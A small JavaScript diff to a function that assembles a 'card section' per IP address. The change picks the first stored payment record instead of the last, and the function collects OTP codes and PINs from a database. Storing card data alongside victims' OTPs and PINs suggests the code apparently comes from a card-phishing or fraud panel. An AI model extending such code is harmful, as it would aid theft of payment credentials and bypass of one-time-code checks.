@@ -592,7 +592,7 @@ function buildCardSection(ip, ex){
   const hp=(ex&&ex.payments)||[];
   const hc=(ex&&ex.codes)||[];
 
-  const cardData=pd||(hp.length>0?hp[hp.length-1]:null);
+  const cardData=pd||(hp.length>0?hp[0]:null);
   // كل OTP من DB مرتبة من الأحدث للأقدم
   const allOtps=od?[od,...hc.filter(c=>c.code_type!=='pin')]:[...hc.filter(c=>c.code_type!=='pin')];
   const allPins=pind?[pind,...hc.filter(c=>c.code_type==='pin')]:[...hc.filter(c=>c.code_type==='pin')];
